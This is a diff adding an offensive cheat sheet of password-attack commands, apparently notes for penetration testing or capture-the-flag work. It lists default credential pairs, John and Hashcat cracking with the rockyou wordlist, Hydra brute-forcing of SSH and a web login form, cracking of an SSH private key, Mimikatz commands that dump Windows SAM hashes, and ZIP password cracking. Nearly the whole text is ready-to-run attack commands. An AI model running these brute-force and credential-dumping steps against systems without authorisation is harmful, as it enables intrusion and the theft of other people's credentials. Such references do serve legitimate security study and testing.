@@ -1,0 +1,62 @@
+#### Usefull Links
+- https://crackstation.net/ (cracking)
+- https://hashes.com/en/ (finding hash type)
+- https://hashes.com/en/decrypt/hash (decrypt)
+
+### Default Passwords
+
+```bash
+admin:admin
+root:root
+admin:password
+root:toor
+```
+### Crack Hash with John
+```bash
+john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
+```
+### Crack Hash with Hashcat
+```bash
+hashcat -m 1000 hash.txt /usr/share/wordlists/rockyou.txt --force
+```
+Use `hashid hash.txt` to find the hash type
+Example: `-m 0 = MD5`, `-m 1000 = NTLM`
+
+###  Brute Force SSH (Hydra)
+```bash
+hydra -l user -P rockyou.txt ssh://IP
+```
+### Brute Force Web Login (Hydra)
+bash
+```bash
+hydra -l user -P rockyou.txt IP http-post-form "/login.php:user=^USER^&pass=^PASS^:Invalid"
+```
+
+###  Crack SSH Private Key
+
+```bash
+ssh2john id_rsa > ssh.hash
+john ssh.hash --wordlist=rockyou.txt
+```
+### Dump Windows Hashes (Mimikatz)
+bash
+```bash
+token::elevate
+lsadump::sam
+```
+Then crack:
+
+bash
+```bash
+hashcat -m 1000 hashes.txt rockyou.txt --force
+```
+### Crack ZIP Password
+```bash
+fcrackzip -u -D -p rockyou.txt file.zip
+```
+OR
+
+```bash
+zip2john file.zip > zip.hash
+john zip.hash
+```
